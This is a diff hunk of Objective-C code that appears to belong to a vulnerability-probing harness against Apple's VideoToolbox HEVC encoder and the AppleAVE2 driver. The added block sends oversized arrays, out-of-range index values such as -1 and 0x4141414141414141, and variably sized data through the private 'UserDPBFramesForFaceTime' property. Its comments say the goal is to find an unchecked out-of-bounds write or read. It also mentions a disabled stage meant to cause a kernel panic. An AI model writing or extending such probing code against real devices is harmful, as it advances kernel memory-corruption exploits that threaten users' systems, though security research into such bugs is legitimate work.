@@ -1134,6 +1134,107 @@ static void KPH9AttsCB(void *refCon, void *src, OSStatus st, VTEncodeInfoFlags f
         CFRelease(sS);
     }
 
+    // === DPB slot OOB ladders (analyst 221032) ===
+    // num0 x32 delivered cb st=0 against a standard 16-slot DPB - the array
+    // reaches AppleAVE2. Now find the edge: size beyond 32, and whether the
+    // CFNumber indexes DPB[idx] unchecked (the real OOB write/read).
+    [report appendString:@"\n--- DPB slot OOB ladders ---\n"];
+    NSMutableArray *dpbCb = [NSMutableArray array];
+    NSDictionary *dpbSpec2 = @{ @"EnableUserRefForFacetime": @YES };
+    VTCompressionSessionRef sD = NULL;
+    OSStatus stD = VTCompressionSessionCreate(
+        kCFAllocatorDefault, 1280, 720, kCMVideoCodecType_HEVC,
+        (__bridge CFDictionaryRef)dpbSpec2, NULL, NULL,
+        KPH9AttsCB, (__bridge void *)dpbCb, &sD);
+    if (stD == noErr && sD) {
+        VTSessionSetProperty(sD, CFSTR("EnableUserRefForFacetime"), kCFBooleanTrue);
+        VTSessionSetProperty(sD, CFSTR("AllocateRVRABuffers"), kCFBooleanTrue);
+        VTCompressionSessionPrepareToEncodeFrames(sD);
+        CVPixelBufferRef pbD2 = NULL;
+        CVPixelBufferCreate(kCFAllocatorDefault, 1280, 720,
+                            kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange, NULL, &pbD2);
+        int64_t ptsD = 0;
+        if (pbD2) {
+            VTCompressionSessionEncodeFrame(sD, pbD2, CMTimeMake(ptsD++, 30), kCMTimeInvalid,
+                                            NULL, NULL, NULL);
+            VTCompressionSessionCompleteFrames(sD, kCMTimeInvalid);
+        }
+        // (1) size ladder: how far does CFNumber delivery go?
+        int sizeLadder[] = { 64, 128, 256, 512, 1024, 4096 };
+        for (int si = 0; si < 6; si++) {
+            int n = sizeLadder[si];
+            NSMutableArray *arr = [NSMutableArray arrayWithCapacity:(NSUInteger)n];
+            for (int e = 0; e < n; e++) [arr addObject:@(e)];
+            [dpbCb removeAllObjects];
+            OSStatus sp = VTSessionSetProperty(sD, CFSTR("UserDPBFramesForFaceTime"), (__bridge CFTypeRef)arr);
+            NSDictionary *fp = @{ @"UserDPBFramesForFaceTime": arr };
+            OSStatus fe = -1;
+            if (pbD2) {
+                fe = VTCompressionSessionEncodeFrame(sD, pbD2, CMTimeMake(ptsD++, 30), kCMTimeInvalid,
+                                                     (__bridge CFDictionaryRef)fp, NULL, NULL);
+                VTCompressionSessionCompleteFrames(sD, kCMTimeInvalid);
+            }
+            [report appendFormat:@"  size[num0 x%-4d] set=%d enc=%d cb=%@\n",
+             n, (int)sp, (int)fe, dpbCb.count ? dpbCb[0] : @"(no cb)"];
+        }
+        // (2) value ladder: does the CFNumber index DPB[idx] unchecked?
+        long long vals[] = { 15, 16, 17, 31, 32, 64, 255, -1, 0x7fffffffLL, 0x4141414141414141LL };
+        for (int vi = 0; vi < 10; vi++) {
+            long long v = vals[vi];
+            NSMutableArray *arr = [NSMutableArray array];
+            for (int e = 0; e < 16; e++) [arr addObject:@(v)];
+            [dpbCb removeAllObjects];
+            OSStatus sp = VTSessionSetProperty(sD, CFSTR("UserDPBFramesForFaceTime"), (__bridge CFTypeRef)arr);
+            NSDictionary *fp = @{ @"UserDPBFramesForFaceTime": arr };
+            OSStatus fe = -1;
+            if (pbD2) {
+                fe = VTCompressionSessionEncodeFrame(sD, pbD2, CMTimeMake(ptsD++, 30), kCMTimeInvalid,
+                                                     (__bridge CFDictionaryRef)fp, NULL, NULL);
+                VTCompressionSessionCompleteFrames(sD, kCMTimeInvalid);
+            }
+            [report appendFormat:@"  val=0x%llx x16 set=%d enc=%d cb=%@\n",
+             v, (int)sp, (int)fe, dpbCb.count ? dpbCb[0] : @"(no cb)"];
+        }
+        // (3) data8 boundaries: length ladder x1, then count ladder at 8B
+        int lenLadder[] = { 8, 16, 24, 32, 64, 128, 256, 1024 };
+        for (int li2 = 0; li2 < 8; li2++) {
+            int len = lenLadder[li2];
+            NSMutableData *d = [NSMutableData dataWithLength:(NSUInteger)len];
+            NSMutableArray *arr = @[ d ].mutableCopy;
+            [dpbCb removeAllObjects];
+            OSStatus sp = VTSessionSetProperty(sD, CFSTR("UserDPBFramesForFaceTime"), (__bridge CFTypeRef)arr);
+            NSDictionary *fp = @{ @"UserDPBFramesForFaceTime": arr };
+            OSStatus fe = -1;
+            if (pbD2) {
+                fe = VTCompressionSessionEncodeFrame(sD, pbD2, CMTimeMake(ptsD++, 30), kCMTimeInvalid,
+                                                     (__bridge CFDictionaryRef)fp, NULL, NULL);
+                VTCompressionSessionCompleteFrames(sD, kCMTimeInvalid);
+            }
+            [report appendFormat:@"  data8 len=%-4d x1 set=%d enc=%d cb=%@\n",
+             len, (int)sp, (int)fe, dpbCb.count ? dpbCb[0] : @"(no cb)"];
+        }
+        int cntLadder[] = { 2, 3, 4, 8, 15, 16 };
+        for (int ci2 = 0; ci2 < 6; ci2++) {
+            int n = cntLadder[ci2];
+            NSMutableArray *arr = [NSMutableArray array];
+            for (int e = 0; e < n; e++) [arr addObject:[NSMutableData dataWithLength:8]];
+            [dpbCb removeAllObjects];
+            OSStatus sp = VTSessionSetProperty(sD, CFSTR("UserDPBFramesForFaceTime"), (__bridge CFTypeRef)arr);
+            NSDictionary *fp = @{ @"UserDPBFramesForFaceTime": arr };
+            OSStatus fe = -1;
+            if (pbD2) {
+                fe = VTCompressionSessionEncodeFrame(sD, pbD2, CMTimeMake(ptsD++, 30), kCMTimeInvalid,
+                                                     (__bridge CFDictionaryRef)fp, NULL, NULL);
+                VTCompressionSessionCompleteFrames(sD, kCMTimeInvalid);
+            }
+            [report appendFormat:@"  data8 x%-2d set=%d enc=%d cb=%@\n",
+             n, (int)sp, (int)fe, dpbCb.count ? dpbCb[0] : @"(no cb)"];
+        }
+        if (pbD2) CVPixelBufferRelease(pbD2);
+        VTCompressionSessionInvalidate(sD);
+        CFRelease(sD);
+    }
+
     // === stage9 PANIC RUNG â€” DISABLED ===
     // To enable: uncomment the block below
     // [report appendString:@"\n--- stage9: PANIC RUNG (NTL=16463) ---\n"];
